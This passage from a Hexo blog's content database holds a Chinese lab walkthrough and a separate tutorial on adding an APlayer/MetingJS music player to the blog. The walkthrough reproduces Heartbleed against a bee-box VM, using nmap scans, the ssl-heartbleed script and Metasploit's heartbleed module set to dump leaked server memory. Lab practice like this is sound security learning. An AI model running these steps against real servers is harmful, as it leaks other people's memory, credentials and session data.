none;\n}\n","variables":""}},"excerpt":"<h3 id=\"前期准备\"><a href=\"#前期准备\" class=\"headerlink\" title=\"前期准备\"></a>前期准备</h3><p>攻击机器还是kali，靶机这里用到的是<a href=\"https://sourceforge.net/projects/bwapp/files/bee-box/\">beebox</a>，下载完之后解压导入虚拟机就可以开始使用了。</p>\n<h3 id=\"nmap扫描\"><a href=\"#nmap扫描\" class=\"headerlink\" title=\"nmap扫描\"></a>nmap扫描</h3><p>攻击发起前，肯定是kali先进行扫描，查看同一网段哪些机器在线。</p>","more":"<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -T4 -A -v -Pn 192.168.20.1/24</span><br></pre></td></tr></table></figure>\n\n<p>扫描完成后发现有一台192.168.20.136的机器在线，复现心脏滴血用到的端口是8443。</p>\n<p><img src=\"/2023/04/22/heartbleed/1.png\" alt=\"扫描结果\"></p>\n<h3 id=\"脚本探测\"><a href=\"#脚本探测\" class=\"headerlink\" title=\"脚本探测\"></a>脚本探测</h3><p>看到机器在线后，使用一个工具探测其8443端口是否可以利用，查看靶机是否有可以利用的机会。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap 192.168.20.136 -p 8443 --script ssl-heartbleed.nse</span><br></pre></td></tr></table></figure>\n\n<p>文字显示是“VULNERABLE”，代表漏洞可以被利用。</p>\n<p><img src=\"/2023/04/22/heartbleed/2.png\" alt=\"脚本探测\"></p>\n<h3 id=\"开始攻击\"><a href=\"#开始攻击\" class=\"headerlink\" title=\"开始攻击\"></a>开始攻击</h3><p>打开<code>msfconsole</code>工具，搜索<code>heartbleed</code>，使用1。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfconsole -q</span><br><span class=\"line\">search heartbleed</span><br><span class=\"line\">use 1</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/04/22/heartbleed/4.png\" alt=\"参数设置\"></p>\n<p>使用<code>show options</code>查看相应的参数并设置，包括<code>rport</code>，<code>rhost</code>，<code>verbose</code>。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">set</span> rport 8443</span><br><span class=\"line\"><span class=\"built_in\">set</span> rhost 192.168.20.136</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/04/22/heartbleed/5.png\" alt=\"参数设置\"></p>\n<p><img src=\"/2023/04/22/heartbleed/8.png\" alt=\"参数设置\"></p>\n<p>其中<code>verbose</code>是要在<code>show advanced</code>下查看的，默认是<code>false</code>，我们<code>set verpose true</code>设置为<code>true </code>，只有这样我们才能明文显示（终端显示）我们拿到的64K的数据。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">show advanced</span><br><span class=\"line\"><span class=\"built_in\">set</span> verbose <span class=\"literal\">true</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/04/22/heartbleed/3.png\" alt=\"参数设置\"></p>\n<p>最后可以用<code>show missing</code>查看遗漏的设置参数，没有遗漏，就可以开始运行了。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">show missing</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/04/22/heartbleed/6.png\" alt=\"参数设置\"></p>\n<p>kali在这边运行着，然后回到靶机上随便点点点，只要发生操作，就会有数据外泄。</p>\n<p><img src=\"/2023/04/22/heartbleed/9.png\" alt=\"参数设置\"></p>\n<p>最后我们回到kali，发现已经拿到数据了。</p>\n<p><img src=\"/2023/04/22/heartbleed/7.png\" alt=\"参数设置\"></p>\n<p>心脏滴血的复现到这里就完成了。</p>"},{"title":"在博客中添加音乐播放器","date":"2023-09-07T02:56:13.000Z","_content":"\n突然的心血来潮想尝试在博客中也可以播放音乐，因为之前也见过大佬的博客有这样的功能，今天抽空研究了一下，没想到竟然成功了，赶紧记录下来。\n\n### 环境准备\n\n1. 安装插件\n\n```bash\nnpm install hexo-tag-aplayer --save\n```\n\n<!-- more -->\n\n要实现博客中添加音乐播放器的方式有两种，第一种配置简单，但是使用麻烦，所以不推荐，第二种配置麻烦，使用简单，所以比较推荐。\n\n### 不推荐使用的方式\n\n1. 安装完成后就可以在markdown页面编辑音乐代码了。\n\n```bash\n{% aplayer 断点 张敬轩 https://music.163.com/song/media/outer/url?id=189323.mp3  %}\n```\n\n上面的案例基本按照这样的代码格式进行编写：\n\n```bash\n{% aplayer title author url [picture_url, narrow, autoplay, width:xxx, lrc:xxx] %}\n```\n\n详细参数如下：\n\n|参数|说明|\n|:---:|:---:|\n|title|歌曲标题|\n|author|歌曲作者|\n|url|音乐文件URL地址|\n|picture_url|（可选）封面图片地址|\n|narrow|（可选）播放器袖珍风格|\n|autoplay|（可选）自动播放，移动端浏览器暂时不支持此功能|\n|width|（可选）播放器宽度 (默认: 100%)|\n|lrc|（可选）歌词文件 URL 地址|\n\n单曲样例：\n\n```bash\n{% aplayer \n\"光るなら\" \n\"Goose house\" \n\"https://cn-south-17-aplayer-46154810.oss.dogecdn.com/hikarunara.mp3\" \n\"https://cn-south-17-aplayer-46154810.oss.dogecdn.com/hikarunara.jpg\" \n\"lrc:https://cn-south-17-aplayer-46154810.oss.dogecdn.com/hikarunara.lrc\" \n\"width:100%\" \n%}\n```\n\n效果如图：\n\n![单曲效果图](./hexo-music/1.png)\n\n除了可以添加一首歌曲，还以编辑歌单，代码如下：\n\n```bash 折叠代码\n{% aplayerlist %}\n{\n    \"narrow\": false,\n    \"autoplay\": false,\n    \"mode\": \"random\",//（可选）'random', 'single' (单曲播放), 'circulation' (循环播放), 'order' (列表播放)， 默认：'circulation' \n    \"showlrc\": 3,\n    \"mutex\": true,\n    \"theme\": \"#e6d0b2\",\n    \"preload\": \"metadata\",\n    \"listmaxheight\": \"513px\",\n    \"music\": [\n        {\n            \"title\": \"前前前世\",\n            \"author\": \"RADWIMPS\",\n            \"url\": \"https://cn-south-17-aplayer-46154810.oss.dogecdn.com/yourname.mp3\",\n            \"pic\": \"https://cn-south-17-aplayer-46154810.oss.dogecdn.com/yourname.jpg\",\n            \"lrc\": \"https://cn-south-17-aplayer-46154810.oss.dogecdn.com/yourname.lrc\"\n        },\n        {\n            \"title\": \"光るなら\",\n            \"author\": \"Goose house\",\n            \"url\": \"https://cn-south-17-aplayer-46154810.oss.dogecdn.com/hikarunara.mp3\",\n            \"pic\": \"https://cn-south-17-aplayer-46154810.oss.dogecdn.com/hikarunara.jpg\",\n            \"lrc\": \"https://cn-south-17-aplayer-46154810.oss.dogecdn.com/hikarunara.lrc\"\n        }\n    ]\n}\n{% endaplayerlist %}\n```\n\n![歌单效果图](./hexo-music/2.png)\n\n歌曲文件，歌曲封面都可以引用本地文件，但是因为音乐，封面，歌词文件都需要自己进行查找，并且还需要借助CDN进行外链生成，很麻烦，所以不建议使用这种方式。\n\n### 推荐使用的方式，引入MetingJS支持\n\n> MetingJS是基于Meting API的APlayer衍生播放器\n\n通过引入MetingJS，播放器将支持QQ音乐、网易云音乐、虾米、酷狗、百度等平台的音乐播放。这种方式比较方便添加在线音乐播放列表。\n\n1. 引入需要在Hexo的配置文件_config.yml中设置。\n\n```bash\naplayer:\n  meting: true # MetingJS 支持\n```\n\n2. 在任意一个Markdown文件里使用 形如以下代码即可使用播放音乐\n\n```bash\n{% meting \"2410869513\" \"netease\" \"playlist\" %}\n```\n\n上面的案例基本按照这样的代码格式进行编写：\n\n```bash\n{% meting \"60198\" \"netease\" \"playlist\" \"autoplay\" \"mutex:false\" \"listmaxheight:340px\" \"preload:none\" \"theme:#ad7a86\" %}\n```\n\n|参数|默认|说明|\n|:---:|:---:|:---:|\n|id|必须值|歌曲 id、播放列表 id、相册 id、搜索关键字|\n|server|必须值|音乐平台: netease, tencent, kugou, xiami, baidu|\n|type|必须值|song, playlist, album, search, artist|\n|fixed|false|开启固定模式|\n|mini|false|开启迷你模式|\n|loop|all|列表循环模式：all, one,none|\n|order|list|列表播放模式： list, random|\n|volume|0.7|播放器音量|\n|lrctype|0|歌词格式类型|\n|listfolded|false|指定音乐播放列表是否折叠|\n|storagename|metingjs|LocalStorage 中存储播放器设定的键名|\n|autoplay|true|自动播放，移动端浏览器暂时不支持此功能|\n|mutex|true|该选项开启时，如果同页面有其他 aplayer 播放，该播放器会暂停|\n|listmaxheight|340px|播放列表的最大高度|\n|preload|auto|音乐文件预载入模式，可选项： none, metadata, auto|\n|theme|#ad7a86|播放器风格色彩设置|\n\n### 设置播放器吸底模式\n\n可以将播放器缩小在左下角，也称作“吸底模式”\n如果在文章中将播放器的参数fixed激活，只会固定在文章页面中，要将其放在文章外，即博客的左下角，需要另外修改页面代码。\n打开themes/next/layout/_layout.njk文件，在body标签里面的最后处加入aplyer的实例html代码。\n\n```bash 折叠代码\n<div class=\"aplayer\" \n  data-id=\"387465322\" \n  data-server=\"netease\" \n  data-type=\"playlist\" \n  data-fixed=\"true\" \n  data-autoplay=\"false\" \n  data-order=\"list\" \n  data-volume=\"0.5\" \n  data-theme=\"#1da496\" \n  data-preload=\"auto\" >\n</div>\n```\n\n在footer或者header引入依赖文件Aplayer.js和Meting.js，metingjs依赖aplayerjs，所以请注意顺序。\n\n```bash\n<link rel=\"stylesheet\" href=\"https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css\">\n<script src=\"https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js\"></script>\n<script src=\"https://cdn.jsdelivr.net/npm/meting@1.2.0/dist/Meting.min.js\"></script>\n```\n\n因为在主题文件中手动加入了依赖文件，所以可以在hexo配置文件中关闭插件的自动脚本插入功能：\n\n```bash\naplayer:\n  meting: true\n  asset_inject: false # 关闭自动脚本插入\n```\n\n![吸底效果图](./hexo-music/3.png)\n\n### 引入pjax实现全局播放\n\n当进入其他页面时，吸底播放器会被打断。要实现音乐的不间断播放，也就是全局音乐效果，可以使用pjax。Next主题已经自带了MoOx/pjax，可手动开启。\n\n在主题设置文件_config.yml中将pjax设置为true。","source":"_posts/hexo-music.md","raw":"---\ntitle: 在博客中添加音乐播放器\ndate: 2023-09-07 10:56:13\ncategories: 博客搭建\ntags:\n  - 博客美化\n---\n\n突然的心血来潮想尝试在博客中也可以播放音乐，因为之前也见过大佬的博客有这样的功能，今天抽空研究了一下，没想到竟然成功了，赶紧记录下来。\n\n### 环境准备\n\n1. 安装插件\n\n```bash\nnpm install hexo-tag-aplayer --save\n```\n\n<!-- more -->\n\n要实现博客中添加音乐播放器的方式有两种，第一种配置简单，但是使用麻烦，所以不推荐，第二种配置麻烦，使用简单，所以比较推荐。\n\n### 不推荐使用的方式\n\n1. 安装完成后就可以在markdown页面编辑音乐代码了。\n\n```bash\n{% aplayer 断点 张敬轩 https://music.163.com/song/media/outer/url?id=189323.mp3  %}\n```\n\n上面的案例基本按照这样的代码格式进行编写：\n\n```bash\n{% aplayer title author url [picture_url, narrow, autoplay, width:xxx, lrc:xxx] %}\n```\n\n详细参数如下：\n\n|参数|说明|\n|:---:|:---:|\n|title|歌曲标题|\n|author|歌曲作者|\n|url|音乐文件URL地址|\n|picture_url|（可选）封面图片地址|\n|narrow|（可选）播放器袖珍风格|\n|autoplay|（可选）自动播放，移动端浏览器暂时不支持此功能|\n|width|（可选）播放器宽度 (默认: 100%)|\n|lrc|（可选）歌词文件 URL 地址|\n\n单曲样例：\n\n```bash\n{% aplayer \n\"光るなら\" \n\"Goose house\" \n\"https://cn-south-17-aplayer-46154810.oss.dogecdn.com/hikarunara.mp3\" \n\"https://cn-south-17-aplayer-46154810.oss.dogecdn.com/hikarunara.jpg\" \n\"lrc:https://cn-south-17-aplayer-46154810.oss.dogecdn.com/hikarunara.lrc\" \n\"width:100%\" \n%}\n```\n\n效果如图：\n\n![单曲效果图](./hexo-music/1.png)\n\n除了可以添加一首歌曲，还以编辑歌单，代码如下：\n\n```bash 折叠代码\n{% aplayerlist %}\n{\n    \"narrow\": false,\n    \"autoplay\": false,\n    \"mode\": \"random\",//（可选）'random', 'single' (单曲播放), 'circulation' (循环播放), 'order' (列表播放)， 默认：'circulation' \n    \"showlrc\": 3,\n    \"mutex\": true,\n    \"theme\": \"#e6d0b2\",\n    \"preload\": \"metadata\",\n    \"listmaxheight\": \"513px\",\n    \"music\": [\n        {\n            \"title\": \"前前前世\",\n            \"author\": \"RADWIMPS\",\n            \"url\": \"https://cn-south-17-aplayer-46154810.oss.dogecdn.com/yourname.mp3\",\n            \"pic\": \"https://cn-south-17-aplayer-46154810.oss.dogecdn.com/yourname.jpg\",\n            \"lrc\": \"https://cn-south-17-aplayer-46154810.oss.dogecdn.com/yourname.lrc\"\n        },\n        {\n            \"title\": \"光るなら\",\n            \"author\": \"Goose house\",\n            \"url\": \"https://cn-south-17-aplayer-46154810.oss.dogecdn.com/hikarunara.mp3\",\n            \"pic\": \"https://cn-south-17-aplayer-46154810.oss.dogecdn.com/hikarunara.jpg\",\n            \"lrc\": \"https://cn-south-17-aplayer-46154810.oss.dogecdn.com/hikarunara.lrc\"\n        }\n    ]\n}\n{% endaplayerlist %}\n```\n\n![歌单效果图](./hexo-music/2.png)\n\n歌曲文件，歌曲封面都可以引用本地文件，但是因为音乐，封面，歌词文件都需要自己进行查找，并且还需要借助CDN进行外链生成，很麻烦，所以不建议使用这种方式。\n\n### 推荐使用的方式，引入MetingJS支持\n\n> MetingJS是基于Meting API的APlayer衍生播放器\n\n通过引入MetingJS，播放器将支持QQ音乐、网易云音乐、虾米、酷狗、百度等平台的音乐播放。这种方式比较方便添加在线音乐播放列表。\n\n1. 引入需要在Hexo的配置文件_config.yml中设置。\n\n```bash\naplayer:\n  meting: true # MetingJS 支持\n```\n\n2. 在任意一个Markdown文件里使用 形如以下代码即可使用播放音乐\n\n```bash\n{% meting \"2410869513\" \"netease\" \"playlist\" %}\n```\n\n上面的案例基本按照这样的代码格式进行编写：\n\n```bash\n{% meting \"60198\" \"netease\" \"playlist\" \"autoplay\" \"mutex:false\" \"listmaxheight:340px\" \"preload:none\" \"theme:#ad7a86\" %}\n```\n\n|参数|默认|说明|\n|:---:|:---:|:---:|\n|id|必须值|歌曲 id、播放列表 id、相册 id、搜索关键字|\n|server|必须值|音乐平台: netease, tencent, kugou, xiami, baidu|\n|type|必须值|song, playlist, album, search, artist|\n|fixed|false|开启固定模式|\n|mini|false|开启迷你模式|\n|loop|all|列表循环模式：all, one,none|\n|order|list|列表播放模式： list, random|\n|volume|0.7|播放器音量|\n|lrctype|0|歌词格式类型|\n|listfolded|false|指定音乐播放列表是否折叠|\n|storagename|metingjs|LocalStorage 中存储播放器设定的键名|\n|autoplay|true|自动播放，移动端浏览器暂时不支持此功能|\n|mutex|true|该选项开启时，如果同页面有其他 aplayer 播放，该播放器会暂停|\n|listmaxheight|340px|播放列表的最大高度|\n|preload|auto|音乐文件预载入模式，可选项： none, metadata, auto|\n|theme|#ad7a86|播放器风格色彩设置|\n\n### 设置播放器吸底模式\n\n可以将播放器缩小在左下角，也称作“吸底模式”\n如果在文章中将播放器的参数fixed激活，只会固定在文章页面中，要将其放在文章外，即博客的左下角，需要另外修改页面代码。\n打开themes/next/layout/_layout.njk文件，在body标签里面的最后处加入aplyer的实例html代码。\n\n```bash 折叠代码\n<div class=\"aplayer\" \n  data-id=\"387465322\" \n  data-server=\"netease\" \n  data-type=\"playlist\" \n  data-fixed=\"true\" \n  data-autoplay=\"false\" \n  data-order=\"list\" \n  data-volume=\"0.5\" \n  data-theme=\"#1da496\" \n  data-preload=\"auto\" >\n</div>\n```\n\n在footer或者header引入依赖文件Aplayer.js和Meting.js，metingjs依赖aplayerjs，所以请注意顺序。\n\n```bash\n<link rel=\"stylesheet\" href=\"https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css\">\n<script src=\"https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js\"></script>\n<script src=\"https://cdn.jsdelivr.net/npm/meting@1.2.0/dist/Meting.min.js\"></script>\n```\n\n因为在主题文件中手动加入了依赖文件，所以可以在hexo配置文件中关闭插件的自动脚本插入功能：\n\n```bash\naplayer:\n  meting: true\n  asset_inject: false # 关闭自动脚本插入\n```\n\n![吸底效果图](./hexo-music/3.png)\n\n### 引入pjax实现全局播放\n\n当进入其他页面时，吸底播放器会被打断。要实现音乐的不间断播放，也就是全局音乐效果，可以使用pjax。Next主题已经自带了MoOx/pjax，可手动开启。\n\n在主题设置文件_config.yml中将pjax设置为true。","slug":"hexo-music","published":1,"updated":"2024-05-03T03:55:54.865Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5ft00667zj3eyznaijl","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>突然的心血来潮想尝试在博客中也可以播放音乐，因为之前也见过大佬的博客有这样的功能，今天抽空研究了一下，没想到竟然成功了，赶紧记录下来。</p>\n<h3 id=\"环境准备\"><a href=\"#环境准备\" class=\"headerlink\" title=\"环境准备\"></a>环境准备</h3><ol>\n<li>安装插件</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install hexo-tag-aplayer --save</span><br></pre></td></tr></table></figure>\n\n<span id=\"more\"></span>\n\n<p>要实现博客中添加音乐播放器的方式有两种，第一种配置简单，但是使用麻烦，所以不推荐，第二种配置麻烦，使用简单，所以比较推荐。</p>\n<h3 id=\"不推荐使用的方式\"><a href=\"#不推荐使用的方式\" class=\"headerlink\" title=\"不推荐使用的方式\"></a>不推荐使用的方式</h3><ol>\n<li>安装完成后就可以在markdown页面编辑音乐代码了。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% aplayer 断点 张敬轩 https://music.163.com/song/media/outer/url?<span class=\"built_in\">id</span>=189323.mp3  %&#125;</span><br></pre></td></tr></table></figure>\n\n<p>上面的案例基本按照这样的代码格式进行编写：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% aplayer title author url [picture_url, narrow, autoplay, width:xxx, lrc:xxx] %&#125;</span><br></pre></td></tr></table></figure>\n\n<p>详细参数如下：</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">参数</th>\n<th align=\"center\">说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">title</td>\n<td align=\"center\">歌曲标题</td>\n</tr>\n<tr>\n<td align=\"center\">author</td>\n<td align=\"center\">歌曲作者</td>\n</tr>\n<tr>\n<td align=\"center\">url</td>\n<td align=\"center\">音乐文件URL地址</td>\n</tr>\n<tr>\n<td align=\"center\">picture_url</td>\n<td align=\"center\">（可选）封面图片地址</td>\n</tr>\n<tr>\n<td align=\"center\">narrow</td>\n<td align=\"center\">（可选）播放器袖珍风格</td>\n</tr>\n<tr>\n<td align=\"center\">autoplay</td>\n<td align=\"center\">（可选）自动播放，移动端浏览器暂时不支持此功能</td>\n</tr>\n<tr>\n<td align=\"center\">width</td>\n<td align=\"center\">（可选）播放器宽度 (默认: 100%)</td>\n</tr>\n<tr>\n<td align=\"center\">lrc</td>\n<td align=\"center\">（可选）歌词文件 URL 地址</td>\n</tr>\n</tbody></table>\n<p>单曲样例：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% aplayer </span><br><span class=\"line\"><span class=\"string\">&quot;光るなら&quot;</span> </span><br><span class=\"line\"><span class=\"string\">&quot;Goose house&quot;</span> </span><br><span class=\"line\"><span class=\"string\">&quot;https://cn-south-17-aplayer-46154810.oss.dogecdn.com/hikarunara.mp3&quot;</span> </span><br><span class=\"line\"><span class=\"string\">&quot;https://cn-south-17-aplayer-46154810.oss.dogecdn.com/hikarunara.jpg&quot;</span> </span><br><span class=\"line\"><span class=\"string\">&quot;lrc:https://cn-south-17-aplayer-46154810.oss.dogecdn.com/hikarunara.lrc&quot;</span> </span><br><span class=\"line\"><span class=\"string\">&quot;width:100%&quot;</span> </span><br><span class=\"line\">%&#125;</span><br></pre></td></tr></table></figure>\n\n<p>效果如图：</p>\n<p><img src=\"/2023/09/07/hexo-music/1.png\" alt=\"单曲效果图\"></p>\n<p>除了可以添加一首歌曲，还以编辑歌单，代码如下：</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% aplayerlist %&#125;</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;narrow&quot;</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;autoplay&quot;</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;mode&quot;</span>: <span class=\"string\">&quot;random&quot;</span>,//（可选）<span class=\"string\">&#x27;random&#x27;</span>, <span class=\"string\">&#x27;single&#x27;</span> (单曲播放), <span class=\"string\">&#x27;circulation&#x27;</span> (循环播放), <span class=\"string\">&#x27;order&#x27;</span> (列表播放)， 默认：<span class=\"string\">&#x27;circulation&#x27;</span> </span><br><span class=\"line\">    <span class=\"string\">&quot;showlrc&quot;</span>: 3,</span><br><span class=\"line\">    <span class=\"string\">&quot;mutex&quot;</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;theme&quot;</span>: <span class=\"string\">&quot;#e6d0b2&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;preload&quot;</span>: <span class=\"string\">&quot;metadata&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;listmaxheight&quot;</span>: <span class=\"string\">&quot;513px&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;music&quot;</span>: [</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;title&quot;</span>: <span class=\"string\">&quot;前前前世&quot;</span>,</span><br><span class=\"line\">            <span class=\"string\">&quot;author&quot;</span>: <span class=\"string\">&quot;RADWIMPS&quot;</span>,</span><br><span class=\"line\">            <span class=\"string\">&quot;url&quot;</span>: <span class=\"string\">&quot;https://cn-south-17-aplayer-46154810.oss.dogecdn.com/yourname.mp3&quot;</span>,</span><br><span class=\"line\">            <span class=\"string\">&quot;pic&quot;</span>: <span class=\"string\">&quot;https://cn-south-17-aplayer-46154810.oss.dogecdn.com/yourname.jpg&quot;</span>,</span><br><span class=\"line\">            <span class=\"string\">&quot;lrc&quot;</span>: <span class=\"string\">&quot;https://cn-south-17-aplayer-46154810.oss.dogecdn.com/yourname.lrc&quot;</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;title&quot;</span>: <span class=\"string\">&quot;光るなら&quot;</span>,</span><br><span class=\"line\">            <span class=\"string\">&quot;author&quot;</span>: <span class=\"string\">&quot;Goose house&quot;</span>,</span><br><span class=\"line\">            <span class=\"string\">&quot;url&quot;</span>: <span class=\"string\">&quot;https://cn-south-17-aplayer-46154810.oss.dogecdn.com/hikarunara.mp3&quot;</span>,</span><br><span class=\"line\">            <span class=\"string\">&quot;pic&quot;</span>: <span class=\"string\">&quot;https://cn-south-17-aplayer-46154810.oss.dogecdn.com/hikarunara.jpg&quot;</span>,</span><br><span class=\"line\">            <span class=\"string\">&quot;lrc&quot;</span>: <span class=\"string\">&quot;https://cn-south-17-aplayer-46154810.oss.dogecdn.com/hikarunara.lrc&quot;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#123;% endaplayerlist %&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/09/07/hexo-music/2.png\" alt=\"歌单效果图\"></p>\n<p>歌曲文件，歌曲封面都可以引用本地文件，但是因为音乐，封面，歌词文件都需要自己进行查找，并且还需要借助CDN进行外链生成，很麻烦，所以不建议使用这种方式。</p>\n<h3 id=\"推荐使用的方式，引入MetingJS支持\"><a href=\"#推荐使用的方式，引入MetingJS支持\" class=\"headerlink\" title=\"推荐使用的方式，引入MetingJS支持\"></a>推荐使用的方式，引入MetingJS支持</h3><blockquote>\n<p>MetingJS是基于Meting API的APlayer衍生播放器</p>\n</blockquote>\n<p>通过引入MetingJS，播放器将支持QQ音乐、网易云音乐、虾米、酷狗、百度等平台的音乐播放。这种方式比较方便添加在线音乐播放列表。</p>\n<ol>\n<li>引入需要在Hexo的配置文件_config.yml中设置。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">aplayer:</span><br><span class=\"line\">  meting: <span class=\"literal\">true</span> <span class=\"comment\"># MetingJS 支持</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>在任意一个Markdown文件里使用 形如以下代码即可使用播放音乐</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% meting <span class=\"string\">&quot;2410869513&quot;</span> <span class=\"string\">&quot;netease&quot;</span> <span class=\"string\">&quot;playlist&quot;</span> %&#125;</span><br></pre></td></tr></table></figure>\n\n<p>上面的案例基本按照这样的代码格式进行编写：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% meting <span class=\"string\">&quot;60198&quot;</span> <span class=\"string\">&quot;netease&quot;</span> <span class=\"string\">&quot;playlist&quot;</span> <span class=\"string\">&quot;autoplay&quot;</span> <span class=\"string\">&quot;mutex:false&quot;</span> <span class=\"string\">&quot;listmaxheight:340px&quot;</span> <span class=\"string\">&quot;preload:none&quot;</span> <span class=\"string\">&quot;theme:#ad7a86&quot;</span> %&#125;</span><br></pre></td></tr></table></figure>\n\n<table>\n<thead>\n<tr>\n<th align=\"center\">参数</th>\n<th align=\"center\">默认</th>\n<th align=\"center\">说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">id</td>\n<td align=\"center\">必须值</td>\n<td align=\"center\">歌曲 id、播放列表 id、相册 id、搜索关键字</td>\n</tr>\n<tr>\n<td align=\"center\">server</td>\n<td align=\"center\">必须值</td>\n<td align=\"center\">音乐平台: netease, tencent, kugou, xiami, baidu</td>\n</tr>\n<tr>\n<td align=\"center\">type</td>\n<td align=\"center\">必须值</td>\n<td align=\"center\">song, playlist, album, search, artist</td>\n</tr>\n<tr>\n<td align=\"center\">fixed</td>\n<td align=\"center\">false</td>\n<td align=\"center\">开启固定模式</td>\n</tr>\n<tr>\n<td align=\"center\">mini</td>\n<td align=\"center\">false</td>\n<td align=\"center\">开启迷你模式</td>\n</tr>\n<tr>\n<td align=\"center\">loop</td>\n<td align=\"center\">all</td>\n<td align=\"center\">列表循环模式：all, one,none</td>\n</tr>\n<tr>\n<td align=\"center\">order</td>\n<td align=\"center\">list</td>\n<td align=\"center\">列表播放模式： list, random</td>\n</tr>\n<tr>\n<td align=\"center\">volume</td>\n<td align=\"center\">0.7</td>\n<td align=\"center\">播放器音量</td>\n</tr>\n<tr>\n<td align=\"center\">lrctype</td>\n<td align=\"center\">0</td>\n<td align=\"center\">歌词格式类型</td>\n</tr>\n<tr>\n<td align=\"center\">listfolded</td>\n<td align=\"center\">false</td>\n<td align=\"center\">指定音乐播放列表是否折叠</td>\n</tr>\n<tr>\n<td align=\"center\">storagename</td>\n<td align=\"center\">metingjs</td>\n<td align=\"center\">LocalStorage 中存储播放器设定的键名</td>\n</tr>\n<tr>\n<td align=\"center\">autoplay</td>\n<td align=\"center\">true</td>\n<td 